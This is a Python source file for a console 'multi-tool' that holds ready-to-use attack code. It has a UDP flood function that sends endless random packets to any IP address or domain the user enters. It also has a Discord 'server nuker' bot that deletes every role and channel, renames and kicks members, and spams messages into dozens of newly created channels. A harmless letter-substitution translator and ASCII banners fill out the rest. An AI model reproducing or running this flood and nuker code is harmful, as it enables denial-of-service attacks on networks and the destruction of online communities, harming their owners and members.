# Lenus Multi-T00l

# Modules
import os, colorama, discord, time, socket, platform, random
from colorama import Fore, Style
from discord.ext import commands
from time import sleep
from platform import system
from data.proxyscrape.proxyscraper import scrape_proxies
from data.userdata.clear_screen import clear_scren


# Variables
user = os.getlogin()
username_file_path = 'data/userdata/user.user'
with open('image.jpg', 'rb') as f:
    YOUR_LOGO_DATA = f.read()
channel1 = "get-fucked-lmao"
channel2 = "bro-got-his-server-destroyed"
channel3 = "thats-crazy"
prefix = "."

# Logos

lenus_logo = f"""
                                    ██▓    ▓█████  ███▄    █  █    ██   ██████ 
                                    ▓██▒    ▓█   ▀  ██ ▀█   █  ██  ▓██▒▒██    ▒ 
                                    ▒██░    ▒███   ▓██  ▀█ ██▒▓██  ▒██░░ ▓██▄   
                                    ▒██░    ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░  ▒   ██▒
                                    ░██████▒░▒████▒▒██░   ▓██░▒▒█████▓ ▒██████▒▒
                                    ░ ▒░▓  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
                                    ░ ░ ▒  ░ ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░
                                    ░ ░      ░      ░   ░ ░  ░░░ ░ ░ ░  ░  ░  
                                    ░  ░   ░  ░         ░    ░  [By S0R] ░

 > [v1.1]
"""


Commands = f"""
                         ▄████▄  ▒█████  ███▄ ▄███▓███▄ ▄███▓▄▄▄      ███▄    █▓█████▄  ██████ 
                        ▒██▀ ▀█ ▒██▒  ██▓██▒▀█▀ ██▓██▒▀█▀ ██▒████▄    ██ ▀█   █▒██▀ ██▒██    ▒ 
                        ▒▓█    ▄▒██░  ██▓██    ▓██▓██    ▓██▒██  ▀█▄ ▓██  ▀█ ██░██   █░ ▓██▄   
                        ▒▓▓▄ ▄██▒██   ██▒██    ▒██▒██    ▒██░██▄▄▄▄██▓██▒  ▐▌██░▓█▄   ▌ ▒   ██▒
                        ▒ ▓███▀ ░ ████▓▒▒██▒   ░██▒██▒   ░██▒▓█   ▓██▒██░   ▓██░▒████▓▒██████▒▒
                        ░ ░▒ ▒  ░ ▒░▒░▒░░ ▒░   ░  ░ ▒░   ░  ░▒▒   ▓▒█░ ▒░   ▒ ▒ ▒▒▓  ▒▒ ▒▓▒ ▒ ░
                          ░  ▒    ░ ▒ ▒░░  ░      ░  ░      ░ ▒   ▒▒ ░ ░░   ░ ▒░░ ▒  ▒░ ░▒  ░ ░
                        ░       ░ ░ ░ ▒ ░      ░  ░      ░    ░   ▒     ░   ░ ░ ░ ░  ░░  ░  ░  
                        ░ ░         ░ ░        ░         ░        ░  ░        ░   ░         ░  
                        ░                                                       ░              

╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                             help = Shows this menu                                                  ║
║                                           nuker = Discord Server Nuker                                              ║
║                                           translator = S0R Translator                                               ║
║                                                ddos = DDoS Menu                                                     ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝                        
"""

SN = f"""
                                         ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                                         ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                                        ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                                        ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                                        ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                                        ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                                        ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                                           ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                                                 ░    ░     ░  ░      ░  ░   ░                
"""
TRNSLTR = f"""
               ▄▄▄█████▓ ██▀███   ▄▄▄       ███▄    █   ██████  ██▓    ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
                ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▓██▒   ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
                ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
                ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██░   ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
                  ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░██████▒▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
                  ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▓  ░▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
                    ░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░░ ░ ▒  ░ ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
                  ░        ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░    ░ ░    ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
                            ░           ░  ░         ░       ░      ░  ░     ░  ░            ░ ░     ░     
                                                                                           
"""

Settings = f"""
                              ██████ ▓█████▄▄▄█████▓▄▄▄█████▓ ██▓ ███▄    █   ▄████   ██████ 
                            ▒██    ▒ ▓█   ▀▓  ██▒ ▓▒▓  ██▒ ▓▒▓██▒ ██ ▀█   █  ██▒ ▀█▒▒██    ▒ 
                            ░ ▓██▄   ▒███  ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░░ ▓██▄   
                              ▒   ██▒▒▓█  ▄░ ▓██▓ ░ ░ ▓██▓ ░ ░██░▓██▒  ▐▌██▒░▓█  ██▓  ▒   ██▒
                            ▒██████▒▒░▒████▒ ▒██▒ ░   ▒██▒ ░ ░██░▒██░   ▓██░░▒▓███▀▒▒██████▒▒
                            ▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒ ░░     ▒ ░░   ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ▒ ▒▓▒ ▒ ░
                            ░ ░▒  ░ ░ ░ ░  ░   ░        ░     ▒ ░░ ░░   ░ ▒░  ░   ░ ░ ░▒  ░ ░
                            ░  ░  ░     ░    ░        ░       ▒ ░   ░   ░ ░ ░ ░   ░ ░  ░  ░  
                               ░     ░  ░                  ░           ░       ░       ░  

╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                1. Change Theme                                                      ║
║                                                2. Legacy Mode                                                       ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝                                
"""

ddos = f"""
                                          ▓█████▄ ▓█████▄  ▒█████    ██████ 
                                          ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                          ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
                                          ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
                                          ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
                                           ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                           ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                           ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                             ░       ░        ░ ░        ░  
                                              ░       ░                        

╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                               1. Website Domain                                                     ║
║                                                 2. IP Address                                                       ║
║                                                3. Back To menu                                                      ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

login = f"""
                                           ██▓     ▒█████    ▄████  ██▓ ███▄    █ 
                                          ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █ 
                                          ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒
                                          ▒██░    ▒██   ██░░▓█  ██▓░██░▓██▒  ▐▌██▒
                                          ░██████▒░ ████▓▒░░▒▓███▀▒░██░▒██░   ▓██░
                                          ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒ 
                                          ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ▒ ░░ ░░   ░ ▒░
                                            ░ ░   ░ ░ ░ ▒  ░ ░   ░  ▒ ░   ░   ░ ░ 
                                              ░  ░    ░ ░        ░  ░           ░ 
                                        
"""




def notavailable():
    print("Not available right now...")
    time.sleep(0.8)
    mainmenu()

def print_centered_text(text, box_width):
    remaining_space = box_width - len(text) - 2
    left_padding = remaining_space // 2
    right_padding = remaining_space - left_padding

    return f" ║{' ' * left_padding}{text}{' ' * right_padding}║"

def print_welcome_message(username):
    box_width = max(len(username) + 20, 118)
    horizontal_line = "═" * (box_width - 2)

    print(" ╔" + horizontal_line + "╗")
    print(print_centered_text(f"Welcome {username}!", box_width))
    print(print_centered_text("Type [help] to see the Commands", box_width))
    print(print_centered_text("Contact samir5940 on discord for help", box_width))
    print(" ╚" + horizontal_line + "╝")

def rddos_tool():
    clear_scren()
    # Socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    while True:
        # UI.
        print(ddos)
        # Input.
        opt = str(input("\n> "))

        # Selection.
        if opt == '1':
            domain = str(input("Domain:"))
            ip = socket.gethostbyname(domain)
            break

        elif opt == '2':
            ip = str(input("IP Address: "))
            break

        elif opt == '3':
            mainmenu()

        else:
            print('\033[91mInvaild Choice!\033[0m')
            time.sleep(2)
            clear_scren()

    # Port selection.
    port_mode = False # If 'False' all ports will be use, if 'True' - certain.
    port = 2

    while 1:
        port_bool = str(input("Certain port? [y/n]: "))

        if (port_bool == "y") or (port_bool == "Y"):
            port_mode = True
            port = int(input("Port: "))
            break

        elif (port_bool == "n") or (port_bool == "N"):
            break

        else:
            print('\033[91mInvaild Choice!\033[0m')
            time.sleep(2)

    # Starting working.
    clear_scren()
    print('\033[36;2mINITIALIZING....')
    time.sleep(1)
    print('STARTING...')
    time.sleep(4)

    sent = 0

    if port_mode == False:  # All ports.
        try:
            while True:
                if port == 65534:
                    port = 1

                elif port == 1900:
                    port = 1901

                sock.sendto(bytes, (ip, port))
                sent += 1
                port += 1
                print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
        except:
            print('\n\033[31;1mExited\033[0m')

    elif port_mode == True: # Certain port.
        if port < 2:
            port = 2
            
        elif port == 65534:
            port = 2

        elif port == 1900:
            port = 1901

        try:
            while True:
                sock.sendto(bytes, (ip, port))
                sent += 1
                print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
        except:
            print('\n\033[31;1mExited\033[0m')


InputArrow = f"""
{Fore.BLUE}╔═══[{Fore.RED}root{Fore.BLUE}@Lenus]
{Fore.BLUE}╚══>{Style.RESET_ALL}"""

def execute_command(command):
    options = {
        'help': helpmenu,
        'nuker': nuker,
        'translator': translate_menu,
        'ddos': rddos_tool,
        'exit': exit
    }

    if command.lower() in options:
        options[command.lower()]()
    else:
        print(f"Invalid command: {command}")

def mainmenu():
    while True:
        clear_scren()
        print(lenus_logo, end="")
        print_welcome_message(user)
        user_input = input(f"{InputArrow} ")

        if user_input.strip(): 
            execute_command(user_input)
        else:
            input("Please Enter a Command...")


def helpmenu():
    clear_scren()
    print(Commands)
    user_input = input(f"{InputArrow} ")

    if user_input.strip(): 
        execute_command(user_input)
    else:
        input("Please Enter a Command...")
        helpmenu()
def nuker():
                clear_scren()
                print(SN)
                token = input(f" Enter Bot Token: ")
                f = open("data/nukermodules/.token", "w")
                f.write(token)
                f.close()

                guildname = input(f" Enter Server Name: ")
                f = open("data/nukermodules/.guild", "w")
                f.write(guildname)
                f.close()

                spammessage = input(f" Spam Message: ")
                f = open("data/nukermodules/.spam", "w")
                f.write(spammessage)
                f.close()

                rolespam = input(f" Role Name: ")
                f = open("data/nukermodules/.role", "w")
                f.write(rolespam)
                f.close()
                snmain()

def snmain():
            token = open("data/nukermodules/.token", "r")
            token = token.read()

            spammessage = open("data/nukermodules/.spam", "r")
            spammessage = spammessage.read()
            lenus = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            lenus.remove_command('help')

            guildname = open("data/nukermodules/.guild", "r")
            guildname = guildname.read()

            rolespam = open("data/nukermodules/.role", "r")
            rolespam = rolespam.read()


            @lenus.event
            async def on_ready():
                if len(lenus.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"Lenus Server Nuker", type=3)
                await lenus.change_presence(status=discord.Status.dnd, activity=activity)
                clear_scren()
                print(SN)
                print(f"Bot : {lenus.user} ({len(lenus.guilds)} {guildpl})")
                print(f"Server Name : {guildname}")
                print(f"Spam message : {spammessage}")
                print(f"")
                print(f"Type: {prefix}nuke to nuke")
                print(f"{Fore.RED}Waiting for Nuke{Fore.WHITE}...")
                print(f"")

            @lenus.event
            async def on_guild_channel_create(channel):
                while True:
                    await channel.send(spammessage)

                    print(f"Sent: {spammessage}")     

            @lenus.event
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite()
                        break
                print(f"Joined Server: {guild.name} ({guild.id}) {invite}")

            @lenus.command()
            async def nuke(ctx):
                await ctx.message.delete()
                print(f"Nuking{ctx.guild.name} ({ctx.guild.id})...")
                await ctx.guild.edit(name=guildname)
                await ctx.guild.edit(icon=YOUR_LOGO_DATA)
                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                        print(f"Deleted: {role.name}")
                    except:
                        print(f"Deleted: {role.name}")

                for member in ctx.guild.members:
                    try:
                        await member.edit(nick="Victim")
                        await member.kick(reason="Server Has Been Nuked Down")
                    except:
                        pass
                    print("Couldnt Change Member Nickname")
                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        print(f"Deleted: #{channel.name}")
                    except:
                        pass
                        print(f"Couldnt Delete: #{channel.name}")
                try:
                    for i in range(50):
                        await ctx.guild.create_text_channel(channel1)
                        await ctx.guild.create_text_channel(channel2)
                        await ctx.guild.create_text_channel(channel3)
                        print(f"Created: #{channel1}")
                        print(f"Created: #{channel2}")
                        print(f"Created: #{channel3}")
                except Exception as er:
                    print(f"Error: {er}")
            try:
                lenus.run(token)
            except Exception as er:
                pass
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                input()

            while True:
                mainmenu()

def s0rtranslator(input_text, to_s0rish=True):
    translation_dict_s0rish = {
        'A': '⨇', 'B': '⧰', 'C': '⇆', 'D': '⨃', 'E': '⇪',
        'F': '⧓', 'G': '⨁', 'H': '⇉', 'I': '⨴', 'J': '⧅',
        'K': '⇴', 'L': '⧉', 'M': '⧔', 'N': '⇶', 'O': '⧂',
        'P': '⨅', 'Q': '⚇', 'R': '⨆', 'S': '⇛', 'T': '⧃',
        'U': '⨠', 'V': '⧀', 'W': '⧢', 'X': '⧄', 'Y': '⧪',
        'Z': '⇏',
        # Add more mappings as needed
    }

    translation_dict_english = {v: k for k, v in translation_dict_s0rish.items()}

    translation_dict = translation_dict_s0rish if to_s0rish else translation_dict_english

    translated_text = ''.join(translation_dict.get(char.upper(), char) for char in input_text)
    return translated_text

def translate_menu():
    clear_scren()
    print(TRNSLTR)
    print("Translation Menu:")
    print("1. Translate to S0rish")
    print("2. Translate to English")
    
    choice = input("Enter your choice (1 or 2): ")
    
    if choice == '1':
        translate_to_s0rish()
    elif choice == '2':
        translate_to_english()
    else:
        print("Invalid choice. Please enter 1 or 2.")
        input("Press Enter to return to the main menu...")

def translate_to_s0rish():
    while True:
        user_input = input("Enter text to translate to S0rish: ")
        translated_result = s0rtranslator(user_input, to_s0rish=True)
        print("Translated to S0rish:", translated_result)
        
        translate_to_s0rish_again = input("Do you want to translate again? (Y/N): ").upper()
        if translate_to_s0rish_again == 'Y':
           translate_menu()
        elif translate_to_s0rish_again == 'N':
            mainmenu()  # Go to the main menu
        else:
            print("Invalid input. Please enter 'Y' or 'N'")
            translate_to_s0rish_again()

def translate_to_english():
    while True:
        user_input = input("Enter text to translate to English (S0rish): ")
        translated_result = s0rtranslator(user_input, to_s0rish=False)
        print("Translated to English (S0rish):", translated_result)
        
        translate_to_english_again = input("Do you want to translate again? (Y/N): ").upper()
        if translate_to_english_again == 'Y':
            translate_menu()
        elif translate_to_english_again == 'N':
            mainmenu()  # Go to the main menu
        else:
            print("Invalid Input. Please enter 'Y' or 'N'")
            translate_to_english_again()
    
scrape_proxies()    

if __name__ == "__main__":
    while True:
        mainmenu()
